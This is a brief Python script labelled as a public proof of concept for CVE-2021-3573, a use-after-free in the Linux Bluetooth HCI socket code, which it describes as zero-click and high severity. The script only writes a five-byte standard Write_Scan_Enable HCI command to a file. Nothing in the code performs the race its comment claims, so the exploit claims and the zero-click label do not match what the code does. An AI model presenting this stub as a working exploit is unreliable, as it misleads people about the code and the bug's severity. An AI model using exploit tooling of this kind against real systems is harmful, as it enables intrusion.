#!/usr/bin/env python3
"""CVE-2021-3573 — Bluetooth hci_sock use-after-free. Zero-click on Linux
with an HCI socket holder. Public PoC. HIGH."""
import sys
from pathlib import Path

def build() -> bytes:
    # HCI command packet fragment that races hci_sock_release
    # type=0x01 (cmd), ogf/ocf = Write_Scan_Enable (0x0C1A)
    return bytes([0x01, 0x1A, 0x0C, 0x01, 0x03])

def main():
    out = Path(sys.argv[1] if len(sys.argv) > 1 else "cve-2021-3573.bin")
    d = build(); out.write_bytes(d)
    print(f"[+] CVE-2021-3573 HCI cmd -> {out} ({len(d)} bytes)")

if __name__ == "__main__":
    main()
